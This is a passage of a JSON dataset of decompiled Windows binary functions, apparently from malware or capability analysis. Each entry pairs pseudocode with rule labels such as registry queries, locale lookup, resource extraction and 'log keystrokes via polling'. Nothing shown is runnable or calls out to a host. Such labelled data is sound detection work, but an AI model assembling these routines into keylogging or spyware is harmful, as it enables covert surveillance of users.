fcn.004051b0();\n                    if (uVar5) {\n                        var_1ch = 0x48ad42;\n                        fcn.004372f8();\n                        var_1ch = 0x48ad59;\n                        fcn.00423f74();\n                    }\n                    goto code_r0x0048aedd;\n                }\n            }\n            var_1ch = 0x48ac72;\n            var_ch = fcn.00476d50();\n            var_20h = 0x48ad17;\n            var_24h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.0048a9d0::var_24h;\n            var_1ch = &stack0xfffffffc;\n            fcn.004372f8();\n            (**(*var_ch + 0x4c))();\n            uVar2 = (**(*var_ch + 0x2c))();\n            piVar3 = fcn.00423eac(uVar2);\n            (**(*piVar3 + 0x40))();\n            uVar2 = (**(*var_ch + 0x20))();\n            piVar3 = fcn.00423eac(uVar2);\n            (**(*piVar3 + 0x34))();\n            piVar3 = fcn.00423eac();\n            (**(*piVar3 + 8))();\n            *in_FS_OFFSET = var_24h;\n            var_1ch = 0x48ad1e;\n            var_20h = 0x48ad16;\n            fcn.00403f58();\n            return;\n        }\n    }\n    else if (iVar4 == 3) {\n        var_1ch = 0x48ad86;\n        cVar1 = (**(**(var_8h + 0x3b0) + 0x3c))();\n        uVar5 = cVar1 == '\\0';\n        if (!uVar5) {\n            var_1ch = 0x48adaf;\n            fcn.004372f8();\n            var_1ch = 0x48adba;\n            fcn.00409454();\n            var_1ch = 0x48adc5;\n            fcn.00408960();\n            var_1ch = 0x48add2;\n            fcn.004051b0();\n            if (!uVar5) {\n                var_1ch = 0x48ade1;\n                fcn.004051b0();\n                if (!uVar5) {\n                    var_1ch = 0x48aeb3;\n                    fcn.004051b0();\n                    if (uVar5) {\n                        var_1ch = 0x48aec6;\n                        fcn.004372f8();\n                        var_1ch = 0x48aedd;\n                        fcn.00423f74();\n                    }\n                    goto code_r0x0048aedd;\n                }\n            }\n            var_1ch = 0x48adfa;\n            var_ch = fcn.00476d50();\n            var_20h = 0x48ae9f;\n            var_24h = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.0048a9d0::var_24h;\n            var_1ch = &stack0xfffffffc;\n            fcn.004372f8();\n            (**(*var_ch + 0x4c))();\n            uVar2 = (**(*var_ch + 0x2c))();\n            piVar3 = fcn.00423eac(uVar2);\n            (**(*piVar3 + 0x40))();\n            uVar2 = (**(*var_ch + 0x20))();\n            piVar3 = fcn.00423eac(uVar2);\n            (**(*piVar3 + 0x34))();\n            piVar3 = fcn.00423eac();\n            (**(*piVar3 + 8))();\n            *in_FS_OFFSET = var_24h;\n            var_1ch = 0x48aea6;\n            var_20h = 0x48ae9e;\n            fcn.00403f58();\n            return;\n        }\n    }\ncode_r0x0048aedd:\n    *in_FS_OFFSET = var_18h;\n    var_10h = 0x48af3e;\n    var_14h = 0x48aef7;\n    fcn.00404dc4();\n    var_14h = 0x48aeff;\n    fcn.00404da0();\n    var_14h = 0x48af0c;\n    fcn.00404dc4();\n    var_14h = 0x48af19;\n    fcn.00404dc4();\n    var_14h = 0x48af26;\n    fcn.00404dc4();\n    var_14h = 0x48af2e;\n    fcn.00404da0();\n    var_14h = 0x48af36;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 2421
    },
    "0041ebec": {
        "rules": [
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0041ebec(uchar *param_1)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t unaff_EBX;\n    uint uVar4;\n    uchar *puStack20;\n    \n    puStack20 = param_1;\n    fcn.00403720();\n    uVar2 = fcn.00405264(0, &puStack20, 0, param_1 + 4);\n    uVar4 = *(in_EAX + 4);\n    iVar3 = sub.advapi32.dll_RegQueryValueExA_1(uVar4, uVar2);\n    uVar1 = fcn.0041e908();\n    *param_1 = uVar1;\n    return CONCAT44(uVar4, unaff_EBX & 0xffffff00 | iVar3 == 0);\n}\n",
        "token_count": 200
    },
    "0040be30": {
        "rules": [
            "get geographical location"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040be30(uint32_t param_1)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetLocaleInfoA_1();\n    if (0 < iVar1) {\n        param_1 = in_EAX & 0xff;\n    }\n    return CONCAT44(in_EAX, param_1);\n}\n",
        "token_count": 87
    },
    "00406b88": {
        "rules": [
            "get thread local storage value"
        ],
        "decompiled_code": "\nint32_t fcn.00406b88(void)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    \n    if (*0x4957f0 == '\\0') {\n        return *(*(in_FS_OFFSET + 0x2c) + *0x4907ac * 4);\n    }\n    iVar1 = sub.kernel32.dll_TlsGetValue(*0x4907ac);\n    if (iVar1 != 0) {\n        return iVar1;\n    }\n    fcn.00406b44();\n    iVar1 = sub.kernel32.dll_TlsGetValue(*0x4907ac);\n    if (iVar1 != 0) {\n        return iVar1;\n    }\n    return *0x4957f8;\n}\n",
        "token_count": 161
    },
    "00417ecc": {
        "rules": [
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00417ecc(uint noname_0, uint lpType)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint lpName;\n    \n    iVar1 = sub.kernel32.dll_FindResourceA();\n    *(in_EAX + 0x10) = iVar1;\n    if (iVar1 == 0) {\n        fcn.00417e2c(&stack0xfffffffc);\n    }\n    iVar1 = sub.kernel32.dll_LoadResource();\n    *(in_EAX + 0x14) = iVar1;\n    if (iVar1 == 0) {\n        fcn.00417e2c(&stack0xfffffffc);\n    }\n    uVar2 = sub.kernel32.dll_SizeofResource();\n    sub.kernel32.dll_LockResource(*(in_EAX + 0x14), uVar2);\n    fcn.00417bd0();\n    return;\n}\n",
        "token_count": 203
    },
    "0043db84": {
        "rules": [
            "log keystrokes via polling",
            "get keyboard layout"
        ],
        "decompiled_code": "\nuchar fcn.0043db84(void)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uchar uVar3;\n    \n    iVar1 = sub.user32.dll_GetKeyState(0xa5);\n    uVar3 = 0;\n    if ((iVar1 < 0) && (iVar2 = sub.user32.dll_GetKeyboardLayout(0),  uVar3 = *0x4915c4,  iVar2 != *0x4915c0)) {\n        fcn.0043d9e0();\n        *0x4915c0 = iVar2;\n        uVar3 = *0x4915c4;\n    }\n    return uVar3;\n}\n",
        "token_count": 152
    },
    "004582e4": {
        "rules": [
            "log keystrokes via polling"
        ],
        "decompiled_code": "\nuint8_t fcn.004582e4(void)\n\n{\n    int16_t iVar1;\n    uint32_t in_EAX;\n    uint8_t uVar2;\n    \n    uVar2 = *0x458320;\n    iVar1 = sub.user32.dll_GetKeyState(0x10);\n    if (iVar1 < 0) {\n        uVar2 = uVar2 | 1;\n    }\n    iVar1 = sub.user32.dll_GetKeyState(0x11);\n    if (iVar1 < 0) {\n        uVar2 = uVar2 | 4;\n    }\n    if ((in_EAX & 0x20000000) != 0) {\n        uVar2 = uVar2 | 2;\n    }\n    return uVar2;\n}\n",
        "token_count": 169
    }
}